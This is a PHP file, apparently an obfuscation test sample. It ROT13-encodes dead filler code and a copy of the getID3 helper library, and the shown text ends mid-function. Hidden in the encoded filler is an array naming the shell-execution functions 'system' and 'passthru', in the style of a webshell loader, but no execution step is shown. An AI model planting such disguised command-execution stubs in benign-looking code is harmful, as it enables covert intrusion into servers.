<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//                                                             //
// trgvq3.yvo.cuc - cneg bs trgVQ3()                           //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs(!qrsvarq('TRGVQ3_YVOKZY_BCGVBAF') && qrsvarq('YVOKZY_IREFVBA')) {
	vs(YVOKZY_IREFVBA >= 20621) {
		qrsvar('TRGVQ3_YVOKZY_BCGVBAF', YVOKZY_ABRAG | YVOKZY_ABARG | YVOKZY_ABJNEAVAT | YVOKZY_PBZCNPG);
	} ryfr {
		qrsvar('TRGVQ3_YVOKZY_BCGVBAF', YVOKZY_ABRAG | YVOKZY_ABARG | YVOKZY_ABJNEAVAT);
	}
}

pynff trgvq3_yvo
{
	/**
	 * @cnenz fgevat      $fgevat
	 * @cnenz obby        $urk
	 * @cnenz obby        $fcnprf
	 * @cnenz fgevat|obby $ugzyrapbqvat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba CevagUrkOlgrf($fgevat, $urk=gehr, $fcnprf=gehr, $ugzyrapbqvat='HGS-8') {
		$ergheafgevat = '';
		sbe ($v = 0; $v < fgeyra($fgevat); $v++) {
			vs ($urk) {
				$ergheafgevat .= fge_cnq(qrpurk(beq($fgevat[$v])), 2, '0', FGE_CNQ_YRSG);
			} ryfr {
				$ergheafgevat .= ' '.(cert_zngpu(\"#[\k20-\k7R]#\", $fgevat[$v]) ? $fgevat[$v] : '¤');
			}
			vs ($fcnprf) {
				$ergheafgevat .= ' ';
			}
		}
		vs (!rzcgl($ugzyrapbqvat)) {
			vs ($ugzyrapbqvat === gehr) {
				$ugzyrapbqvat = 'HGS-8'; // cevbe gb trgVQ3 i1.9.0 gur shapgvba'f 4gu cnenzrgre jnf obbyrna
			}
			$ergheafgevat = ugzyragvgvrf($ergheafgevat, RAG_DHBGRF, $ugzyrapbqvat);
		}
		erghea $ergheafgevat;
	}

	/**
	 * Gehapngrf n sybngvat-cbvag ahzore ng gur qrpvzny cbvag.
	 *
	 * @cnenz sybng $sybngahzore
	 *
	 * @erghea sybng|vag ergheaf vag (vs cbffvoyr, bgurejvfr sybng)
	 */
	choyvp fgngvp shapgvba gehap($sybngahzore) {
		vs ($sybngahzore >= 1) {
			$gehapngrqahzore = sybbe($sybngahzore);
		} ryfrvs ($sybngahzore <= -1) {
			$gehapngrqahzore = prvy($sybngahzore);
		} ryfr {
			$gehapngrqahzore = 0;
		}
		vs (frys::vagInyhrFhccbegrq($gehapngrqahzore)) {
			$gehapngrqahzore = (vag) $gehapngrqahzore;
		}
		erghea $gehapngrqahzore;
	}

	/**
	 * @cnenz vag|ahyy $inevnoyr
	 * @cnenz vag      $vaperzrag
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba fnsr_vap(&$inevnoyr, $vaperzrag=1) {
		vs (vffrg($inevnoyr)) {
			$inevnoyr += $vaperzrag;
		} ryfr {
			$inevnoyr = $vaperzrag;
		}
		erghea gehr;
	}

	/**
	 * @cnenz vag|sybng $sybngahz
	 *
	 * @erghea vag|sybng
	 */
	choyvp fgngvp shapgvba PnfgNfVag($sybngahz) {
		// pbaireg gb sybng vs abg nyernql
		$sybngahz = (sybng) $sybngahz;

		// pbaireg n sybng gb glcr vag, bayl vs cbffvoyr
		vs (frys::gehap($sybngahz) == $sybngahz) {
			// vg'f abg sybngvat cbvag
			vs (frys::vagInyhrFhccbegrq($sybngahz)) {
				// vg'f jvguva vag enatr
				$sybngahz = (vag) $sybngahz;
			}
		}
		erghea $sybngahz;
	}

	/**
	 * @cnenz vag $ahz
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba vagInyhrFhccbegrq($ahz) {
		// purpx vs vagrtref ner 64-ovg
		fgngvp $unfVAG64 = ahyy;
		vs ($unfVAG64 === ahyy) { // 10k snfgre guna vf_ahyy()
			$unfVAG64 = vf_vag(cbj(2, 31)); // 32-ovg vag ner yvzvgrq gb (2^31)-1
			vs (!$unfVAG64 && !qrsvarq('CUC_VAG_ZVA')) {
				qrsvar('CUC_VAG_ZVA', ~CUC_VAG_ZNK);
			}
		}
		// vs vagrtref ner 64-ovg - ab bgure purpx erdhverq
		vs ($unfVAG64 || (($ahz <= CUC_VAG_ZNK) && ($ahz >= CUC_VAG_ZVA))) {
			erghea gehr;
		}
		erghea snyfr;
	}

	/**
	 * Cresbez n qvivfvba, thneqvat ntnvafg qvivfvba ol mreb
	 *
	 * @cnenz sybng|vag $ahzrengbe
	 * @cnenz sybng|vag $qrabzvangbe
	 * @cnenz sybng|vag $snyyonpx
	 * @erghea sybng|vag
	 */
	choyvp fgngvp shapgvba FnsrQvi($ahzrengbe, $qrabzvangbe, $snyyonpx = 0) {
		erghea $qrabzvangbe ? $ahzrengbe / $qrabzvangbe : $snyyonpx;
	}

	/**
	 * @cnenz fgevat $senpgvba
	 *
	 * @erghea sybng
	 */
	choyvp fgngvp shapgvba QrpvznyvmrSenpgvba($senpgvba) {
		yvfg($ahzrengbe, $qrabzvangbe) = rkcybqr('/', $senpgvba);
		erghea (vag) $ahzrengbe / ($qrabzvangbe ? $qrabzvangbe : 1);
	}

	/**
	 * @cnenz fgevat $ovanelahzrengbe
	 *
	 * @erghea sybng
	 */
	choyvp fgngvp shapgvba QrpvznyOvanel2Sybng($ovanelahzrengbe) {
		$ahzrengbe   = frys::Ova2Qrp($ovanelahzrengbe);
		$qrabzvangbe = frys::Ova2Qrp('1'.fge_ercrng('0', fgeyra($ovanelahzrengbe)));
		erghea ($ahzrengbe / $qrabzvangbe);
	}

	/**
	 * @yvax uggc://jjj.fpev.sfh.rqh/~wnp/ZNQ3401/Onpxteaq/ovanel.ugzy
	 *
	 * @cnenz fgevat $ovanelcbvagahzore
	 * @cnenz vag    $znkovgf
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba AbeznyvmrOvanelCbvag($ovanelcbvagahzore, $znkovgf=52) {
		vs (fgecbf($ovanelcbvagahzore, '.') === snyfr) {
			$ovanelcbvagahzore = '0.'.$ovanelcbvagahzore;
		} ryfrvs ($ovanelcbvagahzore[0] == '.') {
			$ovanelcbvagahzore = '0'.$ovanelcbvagahzore;
		}
		$rkcbarag = 0;
		juvyr (($ovanelcbvagahzore[0] != '1') || (fhofge($ovanelcbvagahzore, 1, 1) != '.')) {
			vs (fhofge($ovanelcbvagahzore, 1, 1) == '.') {
				$rkcbarag--;
				$ovanelcbvagahzore = fhofge($ovanelcbvagahzore, 2, 1).'.'.fhofge($ovanelcbvagahzore, 3);
			} ryfr {
				$cbvagcbf = fgecbf($ovanelcbvagahzore, '.');
				$rkcbarag += ($cbvagcbf - 1);
				$ovanelcbvagahzore = fge_ercynpr('.', '', $ovanelcbvagahzore);
				$ovanelcbvagahzore = $ovanelcbvagahzore[0].'.'.fhofge($ovanelcbvagahzore, 1);
			}
		}
		$ovanelcbvagahzore = fge_cnq(fhofge($ovanelcbvagahzore, 0, $znkovgf + 2), $znkovgf + 2, '0', FGE_CNQ_EVTUG);
		erghea neenl('abeznyvmrq'=>$ovanelcbvagahzore, 'rkcbarag'=>(vag) $rkcbarag);
	}

	/**
	 * @yvax uggc://jjj.fpev.sfh.rqh/~wnp/ZNQ3401/Onpxteaq/ovanel.ugzy
	 *
	 * @cnenz sybng $sybnginyhr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba Sybng2OvanelQrpvzny($sybnginyhr) {
		$znkovgf = 128; // gb ubj znal ovgf bs cerpvfvba fubhyq gur pnyphyngvbaf or gnxra?
		$vagcneg   = frys::gehap($sybnginyhr);
		$sybngcneg = nof($sybnginyhr - $vagcneg);
		$cbvagovgfgevat = '';
		juvyr (($sybngcneg != 0) && (fgeyra($cbvagovgfgevat) < $znkovgf)) {
			$sybngcneg *= 2;
			$cbvagovgfgevat .= (fgevat) frys::gehap($sybngcneg);
			$sybngcneg -= frys::gehap($sybngcneg);
		}
		$ovanelcbvagahzore = qrpova($vagcneg).'.'.$cbvagovgfgevat;
		erghea $ovanelcbvagahzore;
	}

	/**
	 * @yvax uggc://jjj.fpev.sfh.rqh/~wnp/ZNQ3401/Onpxteaq/vrrr-rkcy.ugzy
	 *
	 * @cnenz sybng $sybnginyhr
	 * @cnenz vag $ovgf
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba Sybng2Fgevat($sybnginyhr, $ovgf) {
		$rkcbaragovgf = 0;
		$senpgvbaovgf = 0;
		fjvgpu ($ovgf) {
			pnfr 32:
				$rkcbaragovgf = 8;
				$senpgvbaovgf = 23;
				oernx;

			pnfr 64:
				$rkcbaragovgf = 11;
				$senpgvbaovgf = 52;
				oernx;

			qrsnhyg:
				erghea snyfr;
		}
		vs ($sybnginyhr >= 0) {
			$fvtaovg = '0';
		} ryfr {
			$fvtaovg = '1';
		}
		$abeznyvmrqovanel  = frys::AbeznyvmrOvanelCbvag(frys::Sybng2OvanelQrpvzny($sybnginyhr), $senpgvbaovgf);
		$ovnfrqrkcbarag    = cbj(2, $rkcbaragovgf - 1) - 1 + $abeznyvmrqovanel['rkcbarag']; // (127 be 1023) +/- rkcbarag
		$rkcbaragovgfgevat = fge_cnq(qrpova($ovnfrqrkcbarag), $rkcbaragovgf, '0', FGE_CNQ_YRSG);
		$senpgvbaovgfgevat = fge_cnq(fhofge($abeznyvmrqovanel['abeznyvmrq'], 2), $senpgvbaovgf, '0', FGE_CNQ_EVTUG);

		erghea frys::OvtRaqvna2Fgevat(frys::Ova2Qrp($fvtaovg.$rkcbaragovgfgevat.$senpgvbaovgfgevat), $ovgf % 8, snyfr);
	}

	/**
	 * @cnenz fgevat $olgrjbeq
	 *
	 * @erghea sybng|snyfr
	 */
	choyvp fgngvp shapgvba YvggyrRaqvna2Sybng($olgrjbeq) {
		erghea frys::OvtRaqvna2Sybng(fgeeri($olgrjbeq));
	}

	/**
	 * NAFV/VRRR Fgnaqneq 754-1985, Fgnaqneq sbe Ovanel Sybngvat Cbvag Nevguzrgvp
	 *
	 * @yvax uggcf://jro.nepuvir.bet/jro/20120325162206/uggc://jjj.cfp.rqh/trareny/fbsgjner/cnpxntrf/vrrr/vrrr.cuc
	 * @yvax uggc://jjj.fpev.sfh.rqh/~wnp/ZNQ3401/Onpxteaq/vrrr.ugzy
	 *
	 * @cnenz fgevat $olgrjbeq
	 *
	 * @erghea sybng|snyfr
	 */
	choyvp fgngvp shapgvba OvtRaqvna2Sybng($olgrjbeq) {
		$ovgjbeq = frys::OvtRaqvna2Ova($olgrjbeq);
		vs (!$ovgjbeq) {
			erghea 0;
		}
		$fvtaovg = $ovgjbeq[0];
		$sybnginyhr = 0;
		$rkcbaragovgf = 0;
		$senpgvbaovgf = 0;

		fjvgpu (fgeyra($olgrjbeq) * 8) {
			pnfr 32:
				$rkcbaragovgf = 8;
				$senpgvbaovgf = 23;
				oernx;

			pnfr 64:
				$rkcbaragovgf = 11;
				$senpgvbaovgf = 52;
				oernx;

			pnfr 80:
				// 80-ovg Nccyr FNAR sbezng
				// uggc://jjj.znpgrpu.pbz/negvpyrf/znpgrpu/Iby.06/06.01/FNARAbeznyvmrq/
				$rkcbaragfgevat = fhofge($ovgjbeq, 1, 15);
				$vfabeznyvmrq = vaginy($ovgjbeq[16]);
				$senpgvbafgevat = fhofge($ovgjbeq, 17, 63);
				$rkcbarag = cbj(2, frys::Ova2Qrp($rkcbaragfgevat) - 16383);
				$senpgvba = $vfabeznyvmrq + frys::QrpvznyOvanel2Sybng($senpgvbafgevat);
				$sybnginyhr = $rkcbarag * $senpgvba;
				vs ($fvtaovg == '1') {
					$sybnginyhr *= -1;
				}
				erghea $sybnginyhr;

			qrsnhyg:
				erghea snyfr;
		}
		$rkcbaragfgevat = fhofge($ovgjbeq, 1, $rkcbaragovgf);
		$senpgvbafgevat = fhofge($ovgjbeq, $rkcbaragovgf + 1, $senpgvbaovgf);
		$rkcbarag = frys::Ova2Qrp($rkcbaragfgevat);
		$senpgvba = frys::Ova2Qrp($senpgvbafgevat);

		vs (($rkcbarag == (cbj(2, $rkcbaragovgf) - 1)) && ($senpgvba != 0)) {
			// Abg n Ahzore
			$sybnginyhr = ANA;
		} ryfrvs (($rkcbarag == (cbj(2, $rkcbaragovgf) - 1)) && ($senpgvba == 0)) {
			vs ($fvtaovg == '1') {
				$sybnginyhr = -VAS;
			} ryfr {
				$sybnginyhr = VAS;
			}
		} ryfrvs (($rkcbarag == 0) && ($senpgvba == 0)) {
			vs ($fvtaovg == '1') {
				$sybnginyhr = -0.0;
			} ryfr {
				$sybnginyhr = 0.0;
			}
		} ryfrvs (($rkcbarag == 0) && ($senpgvba != 0)) {
			// Gurfr ner 'haabeznyvmrq' inyhrf
			$sybnginyhr = cbj(2, (-1 * (cbj(2, $rkcbaragovgf - 1) - 2))) * frys::QrpvznyOvanel2Sybng($senpgvbafgevat);
			vs ($fvtaovg == '1') {
				$sybnginyhr *= -1;
			}
		} ryfrvs ($rkcbarag != 0) {
			$sybnginyhr = cbj(2, ($rkcbarag - (cbj(2, $rkcbaragovgf - 1) - 1))) * (1 + frys::QrpvznyOvanel2Sybng($senpgvbafgevat));
			vs ($fvtaovg == '1') {
				$sybnginyhr *= -1;
			}
		}
		erghea (sybng) $sybnginyhr;
	}

	/**
	 * @cnenz fgevat $olgrjbeq
	 * @cnenz obby   $flapufnsr
	 * @cnenz obby   $fvtarq
	 *
	 * @erghea vag|sybng|snyfr
	 * @guebjf Rkprcgvba
	 */
	choyvp fgngvp shapgvba OvtRaqvna2Vag($olgrjbeq, $flapufnsr=snyfr, $fvtarq=snyfr) {
		$vaginyhr = 0;
		$olgrjbeqyra = fgeyra($olgrjbeq);
		vs ($olgrjbeqyra == 0) {
			erghea snyfr;
		}
		sbe ($v = 0; $v < $olgrjbeqyra; $v++) {
			vs ($flapufnsr) { // qvfertneq ZFO, rssrpgviryl 7-ovg olgrf
				//$vaginyhr = $vaginyhr | (beq($olgrjbeq{$v}) & 0k7S) << (($olgrjbeqyra - 1 - $v) * 7); // snfgre, ohg ehaf vagb ceboyrzf cnfg 2^31 ba 32-ovg flfgrzf
				$vaginyhr += (beq($olgrjbeq[$v]) & 0k7S) * cbj(2, ($olgrjbeqyra - 1 - $v) * 7);
			} ryfr {
				$vaginyhr += beq($olgrjbeq[$v]) * cbj(256, ($olgrjbeqyra - 1 - $v));
			}
		}
		vs ($fvtarq && !$flapufnsr) {
			// flapufnsr vagf ner abg nyybjrq gb or fvtarq
			vs ($olgrjbeqyra <= CUC_VAG_FVMR) {
				$fvtaZnfxOvg = 0k80 << (8 * ($olgrjbeqyra - 1));
				vs ($vaginyhr & $fvtaZnfxOvg) {
					$vaginyhr = 0 - ($vaginyhr & ($fvtaZnfxOvg - 1));
				}
			} ryfr {
				guebj arj Rkprcgvba('REEBE: Pnaabg unir fvtarq vagrtref ynetre guna '.(8 * CUC_VAG_FVMR).'-ovgf ('.fgeyra($olgrjbeq).') va frys::OvtRaqvna2Vag()');
			}
		}
		erghea frys::PnfgNfVag($vaginyhr);
	}

	/**
	 * @cnenz fgevat $olgrjbeq
	 * @cnenz obby   $fvtarq
	 *
	 * @erghea vag|sybng|snyfr
	 */
	choyvp fgngvp shapgvba YvggyrRaqvna2Vag($olgrjbeq, $fvtarq=snyfr) {
		erghea frys::OvtRaqvna2Vag(fgeeri($olgrjbeq), snyfr, $fvtarq);
	}

	/**
	 * @cnenz fgevat $olgrjbeq
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba YvggyrRaqvna2Ova($olgrjbeq) {
		erghea frys::OvtRaqvna2Ova(fgeeri($olgrjbeq));
	}

	/**
	 * @cnenz fgevat $olgrjbeq
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba OvtRaqvna2Ova($olgrjbeq) {
		$ovainyhr = '';
		$olgrjbeqyra = fgeyra($olgrjbeq);
		sbe ($v = 0; $v < $olgrjbeqyra; $v++) {
			$ovainyhr .= fge_cnq(qrpova(beq($olgrjbeq[$v])), 8, '0', FGE_CNQ_YRSG);
		}
		erghea $ovainyhr;
	}

	/**
	 * @cnenz vag  $ahzore
	 * @cnenz vag  $zvaolgrf
	 * @cnenz obby $flapufnsr
	 * @cnenz obby $fvtarq
	 *
	 * @erghea fgevat
	 * @guebjf Rkprcgvba
	 */
	choyvp fgngvp shapgvba OvtRaqvna2Fgevat($ahzore, $zvaolgrf=1, $flapufnsr=snyfr, $fvtarq=snyfr) {
		vs ($ahzore < 0) {
			guebj arj Rkprcgvba('REEBE: frys::OvtRaqvna2Fgevat() qbrf abg fhccbeg artngvir ahzoref');
		}
		$znfxolgr = (($flapufnsr || $fvtarq) ? 0k7S : 0kSS);
		$vagfgevat = '';
		vs ($fvtarq) {
			vs ($zvaolgrf > CUC_VAG_FVMR) {
				guebj arj Rkprcgvba('REEBE: Pnaabg unir fvtarq vagrtref ynetre guna '.(8 * CUC_VAG_FVMR).'-ovgf va frys::OvtRaqvna2Fgevat()');
			}
			$ahzore = $ahzore & (0k80 << (8 * ($zvaolgrf - 1)));
		}
		juvyr ($ahzore != 0) {
			$dhbgvrag = ($ahzore / ($znfxolgr + 1));
			$vagfgevat = pue(prvy(($dhbgvrag - sybbe($dhbgvrag)) * $znfxolgr)).$vagfgevat;
			$ahzore = sybbe($dhbgvrag);
		}
		erghea fge_cnq($vagfgevat, $zvaolgrf, \"\k00\", FGE_CNQ_YRSG);
	}

	/**
	 * @cnenz vag $ahzore
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba Qrp2Ova($ahzore) {
		vs (!vf_ahzrevp($ahzore)) {
			// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/299
			gevttre_reebe('GlcrReebe: Qrp2Ova(): Nethzrag #1 ($ahzore) zhfg or ahzrevp, '.trgglcr($ahzore).' tvira', R_HFRE_JNEAVAT);
			erghea '';
		}
		$olgrf = neenl();
		juvyr ($ahzore >= 256) {
			$olgrf[] = (vag) (($ahzore / 256) - (sybbe($ahzore / 256))) * 256;
			$ahzore = sybbe($ahzore / 256);
		}
		$olgrf[] = (vag) $ahzore;
		$ovafgevat = '';
		sbernpu ($olgrf nf $v => $olgr) {
			$ovafgevat = (($v == pbhag($olgrf) - 1) ? qrpova($olgr) : fge_cnq(qrpova($olgr), 8, '0', FGE_CNQ_YRSG)).$ovafgevat;
		}
		erghea $ovafgevat;
	}

	/**
	 * @cnenz fgevat $ovafgevat
	 * @cnenz obby   $fvtarq
	 *
	 * @erghea vag|sybng
	 */
	choyvp fgngvp shapgvba Ova2Qrp($ovafgevat, $fvtarq=snyfr) {
		$fvtazhyg = 1;
		vs ($fvtarq) {
			vs ($ovafgevat[0] == '1') {
				$fvtazhyg = -1;
			}
			$ovafgevat = fhofge($ovafgevat, 1);
		}
		$qrpinyhr = 0;
		sbe ($v = 0; $v < fgeyra($ovafgevat); $v++) {
			$qrpinyhr += ((vag) fhofge($ovafgevat, fgeyra($ovafgevat) - $v - 1, 1)) * cbj(2, $v);
		}
		erghea frys::PnfgNfVag($qrpinyhr * $fvtazhyg);
	}

	/**
	 * @cnenz fgevat $ovafgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba Ova2Fgevat($ovafgevat) {
		// erghea 'uv' sbe vachg bs '0110100001101001'
		$fgevat = '';
		$ovafgevaterirefrq = fgeeri($ovafgevat);
		sbe ($v = 0; $v < fgeyra($ovafgevaterirefrq); $v += 8) {
			$fgevat = pue(frys::Ova2Qrp(fgeeri(fhofge($ovafgevaterirefrq, $v, 8)))).$fgevat;
		}
		erghea $fgevat;
	}

	/**
	 * @cnenz vag  $ahzore
	 * @cnenz vag  $zvaolgrf
	 * @cnenz obby $flapufnsr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba YvggyrRaqvna2Fgevat($ahzore, $zvaolgrf=1, $flapufnsr=snyfr) {
		$vagfgevat = '';
		juvyr ($ahzore > 0) {
			vs ($flapufnsr) {
				$vagfgevat = $vagfgevat.pue($ahzore & 127);
				$ahzore >>= 7;
			} ryfr {
				$vagfgevat = $vagfgevat.pue($ahzore & 255);
				$ahzore >>= 8;
			}
		}
		erghea fge_cnq($vagfgevat, $zvaolgrf, \"\k00\", FGE_CNQ_EVTUG);
	}

	/**
	 * @cnenz zvkrq $neenl1
	 * @cnenz zvkrq $neenl2
	 *
	 * @erghea neenl|snyfr
	 */
	choyvp fgngvp shapgvba neenl_zretr_pyboore($neenl1, $neenl2) {
		// jevggra ol xpØuvernovyvgl*pbz
		// gnxra sebz uggc://jjj.cuc.arg/znahny/ra/shapgvba.neenl-zretr-erphefvir.cuc
		vs (!vf_neenl($neenl1) || !vf_neenl($neenl2)) {
			erghea snyfr;
		}
		$arjneenl = $neenl1;
		sbernpu ($neenl2 nf $xrl => $iny) {
			vs (vf_neenl($iny) && vffrg($arjneenl[$xrl]) && vf_neenl($arjneenl[$xrl])) {
				$arjneenl[$xrl] = frys::neenl_zretr_pyboore($arjneenl[$xrl], $iny);
			} ryfr {
				$arjneenl[$xrl] = $iny;
			}
		}
		erghea $arjneenl;
	}

	/**
	 * @cnenz zvkrq $neenl1
	 * @cnenz zvkrq $neenl2
	 *
	 * @erghea neenl|snyfr
	 */
	choyvp fgngvp shapgvba neenl_zretr_abpyboore($neenl1, $neenl2) {
		vs (!vf_neenl($neenl1) || !vf_neenl($neenl2)) {
			erghea snyfr;
		}
		$arjneenl = $neenl1;
		sbernpu ($neenl2 nf $xrl => $iny) {
			vs (vf_neenl($iny) && vffrg($arjneenl[$xrl]) && vf_neenl($arjneenl[$xrl])) {
				$arjneenl[$xrl] = frys::neenl_zretr_abpyboore($arjneenl[$xrl], $iny);
			} ryfrvs (!vffrg($arjneenl[$xrl])) {
				$arjneenl[$xrl] = $iny;
			}
		}
		erghea $arjneenl;
	}

	/**
	 * @cnenz zvkrq $neenl1
	 * @cnenz zvkrq $neenl2
	 *
	 * @erghea neenl|snyfr|ahyy
	 */
	choyvp fgngvp shapgvba syvccrq_neenl_zretr_abpyboore($neenl1, $neenl2) {
		vs (!vf_neenl($neenl1) || !vf_neenl($neenl2)) {
			erghea snyfr;
		}
		# anghenyyl, guvf bayl jbexf aba-erphefviryl
		$arjneenl = neenl_syvc($neenl1);
		sbernpu (neenl_syvc($neenl2) nf $xrl => $iny) {
			vs (!vffrg($arjneenl[$xrl])) {
				$arjneenl[$xrl] = pbhag($arjneenl);
			}
		}
		erghea neenl_syvc($arjneenl);
	}

	/**
	 * @cnenz neenl $gurNeenl
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba xfbeg_erphefvir(&$gurNeenl) {
		xfbeg($gurNeenl);
		sbernpu ($gurNeenl nf $xrl => $inyhr) {
			vs (vf_neenl($inyhr)) {
				frys::xfbeg_erphefvir($gurNeenl[$xrl]);
			}
		}
		erghea gehr;
	}

	/**
	 * @cnenz fgevat $svyranzr
	 * @cnenz vag    $ahzrkgrafvbaf
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba svyrrkgrafvba($svyranzr, $ahzrkgrafvbaf=1) {
		vs (fgefge($svyranzr, '.')) {
			$erirefrqsvyranzr = fgeeri($svyranzr);
			$bssfrg = 0;
			sbe ($v = 0; $v < $ahzrkgrafvbaf; $v++) {
				$bssfrg = fgecbf($erirefrqsvyranzr, '.', $bssfrg + 1);
				vs ($bssfrg === snyfr) {
					erghea '';
				}
			}
			erghea fgeeri(fhofge($erirefrqsvyranzr, 0, $bssfrg));
		}
		erghea '';
	}

	/**
	 * @cnenz vag $frpbaqf
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba CynlgvzrFgevat($frpbaqf) {
		$fvta = (($frpbaqf < 0) ? '-' : '');
		$frpbaqf = ebhaq(nof($frpbaqf));
		$U = (vag) sybbe( $frpbaqf                            / 3600);
		$Z = (vag) sybbe(($frpbaqf - (3600 * $U)            ) /   60);
		$F = (vag) ebhaq( $frpbaqf - (3600 * $U) - (60 * $Z)        );
		erghea $fvta.($U ? $U.':' : '').($U ? fge_cnq($Z, 2, '0', FGE_CNQ_YRSG) : vaginy($Z)).':'.fge_cnq($F, 2, 0, FGE_CNQ_YRSG);
	}

	/**
	 * @cnenz vag $znpqngr
	 *
	 * @erghea vag|sybng
	 */
	choyvp fgngvp shapgvba QngrZnp2Havk($znpqngr) {
		// Znpvagbfu gvzrfgnzc: frpbaqf fvapr 00:00u Wnahnel 1, 1904
		// HAVK gvzrfgnzc:      frpbaqf fvapr 00:00u Wnahnel 1, 1970
		erghea frys::PnfgNfVag($znpqngr - 2082844800);
	}

	/**
	 * @cnenz fgevat $enjqngn
	 *
	 * @erghea sybng
	 */
	choyvp fgngvp shapgvba SvkrqCbvag8_8($enjqngn) {
		erghea frys::OvtRaqvna2Vag(fhofge($enjqngn, 0, 1)) + (sybng) (frys::OvtRaqvna2Vag(fhofge($enjqngn, 1, 1)) / cbj(2, 8));
	}

	/**
	 * @cnenz fgevat $enjqngn
	 *
	 * @erghea sybng
	 */
	choyvp fgngvp shapgvba SvkrqCbvag16_16($enjqngn) {
		erghea frys::OvtRaqvna2Vag(fhofge($enjqngn, 0, 2)) + (sybng) (frys::OvtRaqvna2Vag(fhofge($enjqngn, 2, 2)) / cbj(2, 16));
	}

	/**
	 * @cnenz fgevat $enjqngn
	 *
	 * @erghea sybng
	 */
	choyvp fgngvp shapgvba SvkrqCbvag2_30($enjqngn) {
		$ovanelfgevat = frys::OvtRaqvna2Ova($enjqngn);
		erghea frys::Ova2Qrp(fhofge($ovanelfgevat, 0, 2)) + (sybng) (frys::Ova2Qrp(fhofge($ovanelfgevat, 2, 30)) / cbj(2, 30));
	}


	/**
	 * @cnenz fgevat $NeenlCngu
	 * @cnenz fgevat $Frcnengbe
	 * @cnenz zvkrq $Inyhr
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba PerngrQrrcNeenl($NeenlCngu, $Frcnengbe, $Inyhr) {
		// nffvtaf $Inyhr gb n arfgrq neenl cngu:
		//   $sbb = frys::PerngrQrrcNeenl('/cngu/gb/zl', '/', 'svyr.gkg')
		// vf gur fnzr nf:
		//   $sbb = neenl('cngu'=>neenl('gb'=>'neenl('zl'=>neenl('svyr.gkg'))));
		// be
		//   $sbb['cngu']['gb']['zl'] = 'svyr.gkg';
		$NeenlCngu = ygevz($NeenlCngu, $Frcnengbe);
		$ErghearqNeenl = neenl();
		vs (($cbf = fgecbf($NeenlCngu, $Frcnengbe)) !== snyfr) {
			$ErghearqNeenl[fhofge($NeenlCngu, 0, $cbf)] = frys::PerngrQrrcNeenl(fhofge($NeenlCngu, $cbf + 1), $Frcnengbe, $Inyhr);
		} ryfr {
			$ErghearqNeenl[$NeenlCngu] = $Inyhr;
		}
		erghea $ErghearqNeenl;
	}

	/**
	 * @cnenz neenl $neenlqngn
	 * @cnenz obby  $ergheaxrl
	 *
	 * @erghea vag|snyfr
	 */
	choyvp fgngvp shapgvba neenl_znk($neenlqngn, $ergheaxrl=snyfr) {
		$znkinyhr = snyfr;
		$znkxrl   = snyfr;
		sbernpu ($neenlqngn nf $xrl => $inyhr) {
			vs (!vf_neenl($inyhr)) {
				vs (($znkinyhr === snyfr) || ($inyhr > $znkinyhr)) {
					$znkinyhr = $inyhr;
					$znkxrl = $xrl;
				}
			}
		}
		erghea ($ergheaxrl ? $znkxrl : $znkinyhr);
	}

	/**
	 * @cnenz neenl $neenlqngn
	 * @cnenz obby  $ergheaxrl
	 *
	 * @erghea vag|snyfr
	 */
	choyvp fgngvp shapgvba neenl_zva($neenlqngn, $ergheaxrl=snyfr) {
		$zvainyhr = snyfr;
		$zvaxrl   = snyfr;
		sbernpu ($neenlqngn nf $xrl => $inyhr) {
			vs (!vf_neenl($inyhr)) {
				vs (($zvainyhr === snyfr) || ($inyhr < $zvainyhr)) {
					$zvainyhr = $inyhr;
					$zvaxrl = $xrl;
				}
			}
		}
		erghea ($ergheaxrl ? $zvaxrl : $zvainyhr);
	}

	/**
	 * @cnenz fgevat $KZYfgevat
	 *
	 * @erghea neenl|snyfr
	 */
	choyvp fgngvp shapgvba KZY2neenl($KZYfgevat) {
		vs (shapgvba_rkvfgf('fvzcyrkzy_ybnq_fgevat') && shapgvba_rkvfgf('yvokzy_qvfnoyr_ragvgl_ybnqre')) {
			// uggc://jrofrp.vb/2012/08/27/Ceriragvat-KRR-va-CUC.ugzy
			// uggcf://pber.genp.jbeqcerff.bet/punatrfrg/29378
			// Guvf shapgvba unf orra qrcerpngrq va CUC 8.0 orpnhfr va yvokzy 2.9.0, rkgreany ragvgl ybnqvat vf
			// qvfnoyrq ol qrsnhyg, ohg vf fgvyy arrqrq jura YVOKZY_ABRAG vf hfrq.
			$ybnqre = @yvokzy_qvfnoyr_ragvgl_ybnqre(gehr);
